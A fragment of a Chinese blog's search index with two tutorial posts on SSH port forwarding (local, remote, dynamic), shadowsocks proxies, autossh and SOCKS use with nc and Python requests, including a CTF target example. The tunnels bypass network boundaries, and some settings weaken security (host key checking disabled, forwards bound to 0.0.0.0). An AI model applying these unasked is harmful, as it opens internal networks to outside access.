            <tag> sql注入 </tag>
            
            <tag> python_urllib </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络/ssh代理例子</title>
      <link href="/2018/09/07/wang-luo/ssh-dai-li-li-zi/"/>
      <url>/2018/09/07/wang-luo/ssh-dai-li-li-zi/</url>
      
        <content type="html"><![CDATA[<h3 id="例子1"><a href="#例子1" class="headerlink" title="例子1"></a>例子1</h3><p>将vps流量代理到本地</p><p>情景：有一台国外服务器，当梯子用</p><p>ssserver将</p><pre><code>ssserver -p 2333 -k password -m aes-256-cfb</code></pre><p>本地连接 通过命令行连接或者ss客户端</p><pre><code>sslocal -s x.x.x.x -p 2333 -k password -m aes-256-cfb -l 1082export https_proxy=&quot;socks5://127.0.0.1:1082&quot;</code></pre><p>这样本地连接后 流量显示的是x.x.x.x的ip</p><p>###例子2</p><p>情景：在线下赛，学校实验室的机器都处于局域网内，但在需要其他地方需要访问，需要一台处于公网的jumpbox。</p><p>1 ssh端口转发：将本地的22端口转发到jumpbox的2333端口，在服务区上就可以连接</p><pre><code>ssh -R 2333:localhost:22 root@x.x.x.x</code></pre><p>2 shadowsocks流量转发：在本地9999开启sslocal，将本地9999端口转发到jumpbox的2333端口</p><pre><code>ssserver -p 9999 -k password -m aes-256-cfbssh -R 0.0.0.0:2333:localhost:9999 root@x.x.x.x</code></pre><p>然后使用sslocal通过公网ip的2333端口 就可以代理到内网流量了</p><pre><code>sslocal -s x.x.x.x -p 2333 -k password -m aes-256-cfb -l 1082</code></pre><p>注：ssh -R命令的缺省值是只绑定在 localhost，也就是只有在 jumpbox 本机才可以访问，而其他人都不能访问。</p><p>0.0.0.0是将2333端口绑定在远端的所有ip上，需要在/etc/ssh/sshd_config 添加 GatewayPorts yes 使服务器的 ssh 允许转发 0.0.0.0</p><p>sudo systemctl restart sshd 使其生效</p><h3 id="例子3"><a href="#例子3" class="headerlink" title="例子3"></a>例子3</h3><p>使服务器使用本地的梯子（服务器上没有ss 无法连接梯子）</p><p>本地1086 有sslocal应用 国外梯子</p><p>通过反向代理将 本地的1086端口代理到服务器的2333端口</p><pre><code>ssh -R 0.0.0.0:2333:localhost:1086 root@x.x.x.x</code></pre><p>服务器端 http再走2333代理</p><pre><code>export http_proxy=&quot;socks5://127.0.0.1:2333&quot;</code></pre><p>代理之后 服务器可以使用梯子</p><h3 id="稳定的ssh连接"><a href="#稳定的ssh连接" class="headerlink" title="稳定的ssh连接"></a>稳定的ssh连接</h3><p>不过上面这么做并不稳健，如果因为网络波动导致 ssh -R 那个连接断了，那么从 jumpbox 就完全失去了到 lab 的控制。万幸的是，有一个叫做 autossh 的软件，可以自动的检测断线，并在断线的时候重连。</p><pre><code>sudo apt-get install autossh #Ubuntubrew install autossh #mac</code></pre><pre><code>//rootautossh -M 30000 -o &quot;StrictHostKeyChecking=false&quot; -o &quot;ServerAliveInterval 10&quot; -o &quot;ServerAliveCountMax 10&quot; -NR 2333:localhost:9999 root@x.x.x.x -i /Users/hh/ssh-key/id_rsa</code></pre><p>上面这句话里面 -N 表示非不执行命令，只做端口转发；-f 表示在后台运行，也就是说，这句话执行之后 autossh 就在后台默默工作啦；-R 2333:localhost:9999 就是把本地的9999端口转发到远程的2333端口。-i是ssh的命令参数，通过密钥免密登陆，当ssh中断重新连接时不用重新输入密码</p><p>###终端代理</p><p>把代理服务器地址写入shell配置文件.bashrc或者.zshrc 直接在.bashrc或者.zshrc添加下面内容</p><pre class=" language-text"><code class="language-text">export http_proxy="http://localhost:port"export https_proxy="http://localhost:port"</code></pre><p>或者走socket5协议（ss,ssr）的话，代理端口是1080</p><pre class=" language-text"><code class="language-text">export http_proxy="socks5://127.0.0.1:1080"export https_proxy="socks5://127.0.0.1:1080"</code></pre><p>或者干脆直接设置ALL_PROXY</p><pre class=" language-text"><code class="language-text">export ALL_PROXY=socks5://127.0.0.1:1080</code></pre><p>最后在执行如下命令应用设置</p><pre class=" language-text"><code class="language-text">source ~/.bashrc</code></pre><p>或者通过设置alias简写来简化操作，每次要用的时候输入setproxy，不用了就unsetproxy。</p><pre class=" language-console"><code class="language-console"> alias setproxy="export ALL_PROXY=socks5://127.0.0.1:1080" alias unsetproxy="unset ALL_PROXY"</code></pre><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="http://hideonlab.blogspot.com/2018/12/sshshadowsocks.html" target="_blank" rel="noopener">http://hideonlab.blogspot.com/2018/12/sshshadowsocks.html</a></p><p><a href="https://blog.csdn.net/autoliuweijie/article/details/80283689" target="_blank" rel="noopener">https://blog.csdn.net/autoliuweijie/article/details/80283689</a> </p>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络/ssh代理多种模式</title>
      <link href="/2018/09/07/wang-luo/ssh-dai-li-duo-chong-mo-shi/"/>
      <url>/2018/09/07/wang-luo/ssh-dai-li-duo-chong-mo-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="SSH命令"><a href="#SSH命令" class="headerlink" title="SSH命令"></a>SSH命令</h1><p>SSH命令参数 (大小写注意区分)</p><pre><code>正向代理 ssh -fCNL反向代理 ssh -fCNR-f 后台执行ssh指令-C 允许压缩数据-N 不执行远程指令-R 将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口-L 将本地机(客户机)的某个端口转发到远端指定机器的指定端口-p 指定远程主机的端口</code></pre><pre><code>linuxnetstat -an | grep 8899   # 查看端口转发情况sudo lsof -i:8899       (kill PID)sudo ufw allow 8899       # 防火墙打开端口，记得打开阿里云官网的防火墙sudo systemctl restart sshdwindowsnetstat -ano | findstr &quot;2121&quot;(port) tasklist | findstr &quot;20144&quot;(PID)taskkill /F  /PID 20144(PID) #终止进程</code></pre><h2 id="端口本地转发-正向代理-L"><a href="#端口本地转发-正向代理-L" class="headerlink" title="端口本地转发 正向代理 (L)"></a>端口本地转发 正向代理 (L)</h2><p><strong>将中间主机可访问的主机的指定端口 镜像到本地指定端口</strong> </p><blockquote><p>ssh -L 本地IP:本地端口:中间主机可访问的IP:中间主机可访问的IP的端口 root@中间主机</p></blockquote><p>案例：公司为了安全配置了两台机器，一台可供外网访问[公司主机A]。另外一台不能外网访问[公司主机B]，但可与[公司主机A]互连。现在我在遥远外地，我要取公司[主机B]的文件，但此时无人在公司。 但我有一台连接外网的[个人主机P]</p><table><thead><tr><th align="center">主机名</th><th align="center">公网IP</th><th align="center">内网ip</th></tr></thead><tbody><tr><td align="center">[公司主机A]</td><td align="center">218.200.20.1</td><td align="center">192.168.1.100</td></tr><tr><td align="center">[公司主机B]</td><td align="center">无</td><td align="center">192.168.1.101</td></tr><tr><td align="center">[个人主机P]</td><td align="center">218.200.20.2</td><td align="center">无</td></tr></tbody></table><p>我要访问内网101的FTP的话，就在[个人主机P]上执行： </p><blockquote><p>ssh -L [个人主机P]:[个人主机P未被占用的任意端口]:[公司主机B]:[公司主机B对应服务的端口] [公司主机A用户]@[公司主机A外网IP]</p></blockquote><blockquote><p>ssh -L 127.0.0.1:2121:192.168.1.101:21 <a href="mailto:root@218.200.20.1" target="_blank" rel="noopener">root@218.200.20.1</a><br>然后再在[个人主机P]访问ftp即可访问地址为：<a href="ftp://127.0.0.1:2121/" target="_blank" rel="noopener">ftp://127.0.0.1:2121</a></p></blockquote><h2 id="端口远程转发-反向代理-R"><a href="#端口远程转发-反向代理-R" class="headerlink" title="端口远程转发 反向代理 (R)"></a>端口远程转发 反向代理 (R)</h2><p><strong>将本地可访问的主机的指定端口 镜像到远程指定端口</strong><br>ssh -R 远程IP:远程端口:本地可访问IP:本地可访问IP的端口 root@远程主机</p><p>案例：公司为了安全配置了两台机器，一台可供外网访问[公司主机A]。另外一台不能外网访问[公司主机B]，但可与[公司主机A]互连。现在我在公司，外网有同事要取公司[主机B]的文件，但公司不能给他[公司主机A]的账号信息，但他知道[公司主机B]的个人FTP用户信息，但不能给我知道。</p><table><thead><tr><th align="center">主机名</th><th align="center">公网ip</th><th align="center">内网ip</th><th align="center">用户</th><th align="center">密码</th></tr></thead><tbody><tr><td align="center">[公司主机A]</td><td align="center">218.200.20.1</td><td align="center">192.168.1.100</td><td align="center">root</td><td align="center">已知</td></tr><tr><td align="center">[公司主机B]</td><td align="center">无</td><td align="center">192.168.1.101</td><td align="center">root</td><td align="center">未知</td></tr><tr><td align="center">[个人主机P]</td><td align="center">218.200.20.2</td><td align="center">无</td><td align="center">root</td><td align="center">已知</td></tr></tbody></table><p>在公司的[公司主机A]上执行 </p><blockquote><p>ssh -R [要接收该映射的主机的可访问IP]:[要接收该映射的主机的未占用端口]:[公司主机A可访问的主机]:[公司主机A可访问的主机的端口] [要接收该映射的主机的用户]@[要接收该映射的主机的IP]</p></blockquote><blockquote><p>ssh -R 127.0.0.1:2121:192.168.1.101:21 <a href="mailto:root@218.200.20.2" target="_blank" rel="noopener">root@218.200.20.2</a></p></blockquote><p>其实在外地的同事只需要访问本机的127.0.0.1:2121就相当于访问192.168.1.101:21了</p><h2 id="端口动态转发-D"><a href="#端口动态转发-D" class="headerlink" title="端口动态转发 (D)"></a>端口动态转发 (D)</h2><p>当访问internet时，本机的1080端口做为代理服务器(socks5代理)，访问请求被转发到sshserver上，由sshserver替之访问internet</p><blockquote><p>ssh -fCND 1083 <a href="mailto:root@x.x.x.x" target="_blank" rel="noopener">root@x.x.x.x</a></p></blockquote><blockquote><p>ssh -fN -D 0.0.0.0:1083 <a href="mailto:root@x.x.x.x" target="_blank" rel="noopener">root@x.x.x.x</a></p></blockquote><p>执行之后 使用本地1083的socks5代理 流量显示为服务器x.x.x.x的ip</p><h2 id="通过代理连接服务器-O"><a href="#通过代理连接服务器-O" class="headerlink" title="通过代理连接服务器 (O)"></a>通过代理连接服务器 (O)</h2><p><strong>背景</strong></p><ul><li>客户机：<code>client.net</code></li><li>代理服务器：<code>proxy.net</code>，安装代理服务器软件，通过 <code>1080</code> 端口，提供 Socket5 代理服务</li><li>目标服务器：<code>server.net</code>，在默认 <code>22</code> 端口，提供 SSH 服务 </li></ul><p><code>-X</code> <strong>指定代理协议</strong></p><ul><li><code>4</code> SOCKS v.4</li><li><code>5</code> SOCKS v.5<strong>（默认）</strong></li><li><code>connect</code> HTTPS proxy</li></ul><p><code>-x</code> <strong>代理地址[:端口]</strong></p><p>如果没有指定端口，采用协议常用端口，如：</p><ul><li>SOCKETS 使用 1080</li><li>HTTPS 使用 3128</li></ul><p>####1命令行</p><pre><code>$ ssh -o ProxyCommand=&quot;nc -X 5 -x proxy.net:1080 %h %p&quot; user@server.net$ ssh -o &quot;ProxyCommand nc -X 5 -x proxy.net:1080 %h %p&quot; user@server.net</code></pre><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>node2.buuoj.cn.wetolink.com:28655为靶机内网对外 socks5 代理地址，请在浏览器设置代理后访问 <a href="http://web/" target="_blank" rel="noopener">http://web/</a> 打开靶机。靶机无法访问外网，所以在内网提供了一台 LAMP 服务器，主机名为 <a href="http://baidu.com/" target="_blank" rel="noopener">baidu.com</a>，ssh 用户名：root，ssh密码：123456</p><pre><code>ssh -o &quot;ProxyCommand nc -X 5 -x node2.buuoj.cn.wetolink.com:28655 %h %p&quot; root@baidu.com</code></pre><h4 id="2使用SSH配置文件"><a href="#2使用SSH配置文件" class="headerlink" title="2使用SSH配置文件"></a>2使用SSH配置文件</h4><p><code>SSH</code> 配置文件位置：</p><pre class=" language-plain"><code class="language-plain">~/.ssh/config</code></pre><p>增加如下两行内容：</p><pre class=" language-plain"><code class="language-plain">Host *    ProxyCommand nc -X 5 -x proxy.net:1080 %h %p</code></pre><p>使用配置文件之后，就不需要在命令行中进行代理配置了。</p><h4 id="python-request-proxy"><a href="#python-request-proxy" class="headerlink" title="python request proxy"></a>python request proxy</h4><pre class=" language-python"><code class="language-python">proxy <span class="token operator">=</span> <span class="token string">'node1.buuoj.cn:28421'</span>proxies <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'http'</span><span class="token punctuation">:</span> <span class="token string">'socks5h://'</span> <span class="token operator">+</span> proxy<span class="token punctuation">,</span>    <span class="token string">'https'</span><span class="token punctuation">:</span> <span class="token string">'socks5h://'</span> <span class="token operator">+</span> proxy<span class="token punctuation">}</span>r<span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>payload<span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxies<span class="token punctuation">)</span></code></pre><p>In a proxy string, socks5h:// and socks4a:// mean that the hostname is<br>resolved by the SOCKS server. socks5:// and socks4:// mean that the<br>hostname is resolved locally. socks4a:// means to use SOCKS4a, which is<br>an extension of SOCKS4</p>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
